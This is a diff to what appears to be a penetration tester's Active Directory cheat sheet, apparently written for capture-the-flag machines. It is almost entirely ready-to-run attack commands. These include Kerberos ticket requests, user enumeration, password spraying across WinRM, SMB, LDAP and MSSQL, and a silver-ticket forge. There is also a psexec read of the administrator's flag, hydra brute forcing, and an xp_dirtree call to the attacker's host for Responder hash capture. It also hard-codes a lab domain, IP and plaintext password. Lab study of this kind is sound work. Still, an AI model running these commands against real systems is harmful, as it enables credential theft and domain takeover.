@@ -129,6 +129,8 @@ impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Gues
 sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
+impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
@@ -137,10 +139,10 @@ certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enable
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
 
 ## Spray
-(nxc winrm "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
-(nxc smb "$TARGET"  --dns-server $TARGET -u usernames -p passwords -k &)
-(nxc ldap "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
-(nxc mssql "$TARGET" --dns-server $TARGET -u usernames -p passwords -k &)
+(nxc winrm "$TARGET" --dns-server $TARGET -u usernames -p passwords &)
+(nxc smb "$TARGET" --dns-server $TARGET -u usernames -p passwords &)
+(nxc ldap "$TARGET" --dns-server $TARGET -u usernames -p passwords &)
+(nxc mssql "$TARGET" --dns-server $TARGET -u usernames -p passwords &)
 
 ## ROOT FLAG
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
@@ -670,13 +672,19 @@ impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '12
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
 
-+---------- Silver Ticket Attacks ----------+
-TICKET_SID=$(impacket-getPac '$DOM'/'$USERNAME':'$PASSWORD' -targetUser 'Administrator' 2>/dev/null | grep 'Domain SID: ' | cut -d ':' -f 2- | tr -d ' ');echo $TICKET_SID
-TICKET_SPN=$(impacket-GetUserSPNs -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD' -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1); echo $TICKET_SPN
-TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/'); echo $TICKET_NTLM
-impacket-ticketer -domain '$DOM' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$DOM" Administrator 2>/dev/null
-export KRB5CCNAME="$PWD/Administrator.ccache"; chmod 0600 "$KRB5CCNAME"
-impacket-describeTicket Administrator.ccache
++---------- Silver Ticket ----------+
+-->> Domain SID
+bloodyAD --dc-ip $TARGET --host DC1.scrm.local -d scrm.local -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' > silver-ticket
+
+-->> Service Principal Name
+impacket-GetUserSPNs -dc-ip 10.10.11.168 -dc-host DC1.scrm.local scrm.local/ -k -no-pass -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1 | sort -u >> silver-ticket
+
+-->> Service Account Password Hash
+echo -n 'Pegasus60' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket
+
+-->> Create Ticket
+cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }
+export KRB5CCNAME=`pwd`/administrator.ccache
 
 [*] (135) RPC
 rpcclient -U "" -N $TARGET -c "enumdomusers"
@@ -816,6 +824,11 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
++---------- Impacket ----------+
+impacket-mssqlclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
+impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
+impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
+
 +---------- Get DB ----------+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'
 
@@ -836,10 +849,6 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC x
 +---------- Get Hash ----------+
 sudo responder -I tun0 -v
 DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
-
-+---------- Impacket ----------+
-impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
-impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
 [*] (1521) OracleTNS
 +---------- Find Service Name ----------+
